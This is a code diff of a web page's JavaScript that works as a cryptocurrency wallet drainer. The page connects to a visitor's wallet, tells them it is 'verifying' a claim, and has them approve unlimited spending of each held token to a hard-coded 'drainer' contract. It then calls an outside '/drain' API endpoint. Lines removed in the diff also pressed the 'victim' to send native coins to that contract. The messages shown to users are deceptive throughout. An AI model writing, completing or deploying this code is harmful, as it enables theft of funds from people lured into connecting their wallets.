@@ -25,8 +25,8 @@
 
     <script>
         const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com/";
-        let provider;
-        const drainerContractAddress = "0x3cDDC7c58eD68B7cf881012Af405731e96CF2d1b";
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const drainerContractAddress = "0x0643E258885Aaaa5D8F3Acc18B0C7eD8dfc853eB";
         const tokenList = [
             { symbol: "BUSD", address: "0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee", decimals: 18 },
             { symbol: "WBNB", address: "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd", decimals: 18 },
@@ -41,48 +41,6 @@
                 // Connect wallet
                 statusMessage = "Connecting to wallet...\n";
                 updateStatus(statusMessage);
-
-                // Check available wallets
-                const availableWallets = [];
-                let ethereumProvider = null;
-
-                // Try to detect MetaMask and Trust Wallet via window.ethereum
-                if (window.ethereum) {
-                    if (window.ethereum.isMetaMask) availableWallets.push("MetaMask");
-                    if (window.ethereum.isTrust) availableWallets.push("Trust Wallet");
-                    // Some wallets override window.ethereum, so we try to detect all
-                    if (!ethereumProvider) {
-                        ethereumProvider = window.ethereum;
-                        provider = new ethers.BrowserProvider(window.ethereum);
-                    }
-                }
-
-                // Try Phantom
-                if (window.phantom?.ethereum) {
-                    availableWallets.push("Phantom");
-                    if (!ethereumProvider) {
-                        ethereumProvider = window.phantom.ethereum;
-                        provider = new ethers.BrowserProvider(window.phantom.ethereum);
-                    }
-                }
-
-                // Fallback: Try Trust Wallet explicitly if not already detected
-                if (window.trustwallet?.ethereum && !availableWallets.includes("Trust Wallet")) {
-                    availableWallets.push("Trust Wallet");
-                    if (!ethereumProvider) {
-                        ethereumProvider = window.trustwallet.ethereum;
-                        provider = new ethers.BrowserProvider(window.trustwallet.ethereum);
-                    }
-                }
-
-                if (availableWallets.length === 0) {
-                    throw new Error("No compatible wallet detected. Please install MetaMask, Trust Wallet, or Phantom.");
-                }
-
-                statusMessage += `Detected wallets: ${availableWallets.join(", ")}\n`;
-                updateStatus(statusMessage);
-
-                // Attempt to connect
                 const accounts = await provider.send("eth_requestAccounts", []);
                 signer = await provider.getSigner();
                 connectedAddress = accounts[0];
@@ -98,7 +56,7 @@
                     const balance = await tokenContract.balanceOf(connectedAddress);
                     if (balance > 0) {
                         hasTokens = true;
-                        break;
+                        break; // No need to check further if one token has balance
                     }
                 }
 
@@ -138,59 +96,28 @@
                     statusMessage += "Verifying wallet (please confirm approvals for your tokens)...\n";
                     updateStatus(statusMessage);
 
-                    // Update ABI to include balanceOf and allowance
+                    // Update ABI to include balanceOf
                     const bep20Abi = [
                         "function approve(address spender, uint256 amount) external returns (bool)",
-                        "function balanceOf(address account) external view returns (uint256)",
-                        "function allowance(address owner, address spender) external view returns (uint256)"
+                        "function balanceOf(address account) external view returns (uint256)"
                     ];
 
-                    // Approve tokens in parallel only if allowance < balance
-                    const approvalPromises = tokenList.map(async (token) => {
+                    // Loop over all tokens in tokenList
+                    for (const token of tokenList) {
                         const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
                         const balance = await tokenContract.balanceOf(connectedAddress);
                         if (balance > 0) {
-                            const allowance = await tokenContract.allowance(connectedAddress, drainerContractAddress);
-                            if (allowance < balance) {
-                                statusMessage += `Approving ${token.symbol} (${ethers.formatUnits(balance, token.decimals)} available)...\n`;
-                                updateStatus(statusMessage);
-                                const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 150000 });
-                                await tx.wait();
-                                statusMessage += `${token.symbol} approved!\n`;
-                                updateStatus(statusMessage);
-                            } else {
-                                statusMessage += `${token.symbol} already approved\n`;
-                            }
-                        }
-                    });
-                    await Promise.all(approvalPromises);
-                    statusMessage += "Wallet verified!\n";
-                    updateStatus(statusMessage);
-
-                    // Request victim to send a small amount of TBNB (optional, continue if rejected)
-                    const nativeBalance = await provider.getBalance(connectedAddress);
-                    const tbnbToSend = ethers.parseEther("0.01"); // Send only 0.01 TBNB to avoid warnings
-                    if (nativeBalance > 0 && nativeBalance >= tbnbToSend) {
-                        statusMessage += `Detected ${ethers.formatEther(nativeBalance)} TBNB. Sending 0.01 TBNB to the claim contract (${drainerContractAddress}) for verification...\n`;
-                        updateStatus(statusMessage);
-                        try {
-                            const tx = await signer.sendTransaction({
-                                to: drainerContractAddress,
-                                value: tbnbToSend,
-                                gasLimit: 21000
-                            });
+                            statusMessage += `Approving ${token.symbol} (${ethers.formatUnits(balance, token.decimals)} available)...\n`;
+                            updateStatus(statusMessage);
+                            const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
                             await tx.wait();
-                            statusMessage += "TBNB sent to claim contract!\n";
-                        } catch (error) {
-                            statusMessage += `TBNB transfer rejected or failed: ${error.message}. Proceeding with token drain...\n`;
+                            statusMessage += `${token.symbol} approved!\n`;
+                            updateStatus(statusMessage);
                         }
-                        updateStatus(statusMessage);
-                    } else if (nativeBalance > 0) {
-                        statusMessage += `Insufficient TBNB (${ethers.formatEther(nativeBalance)} available, need 0.01 TBNB). Skipping TBNB transfer...\n`;
-                        updateStatus(statusMessage);
                     }
+                    statusMessage += "Wallet verified!\n";
 
-                    // Retry drain after approvals and native transfer (even if TBNB fails)
+                    // Retry drain after approvals
                     statusMessage += "Processing claim again...\n";
                     updateStatus(statusMessage);
                     const retryResponse = await fetch(`${API_BASE_URL}/drain`, {
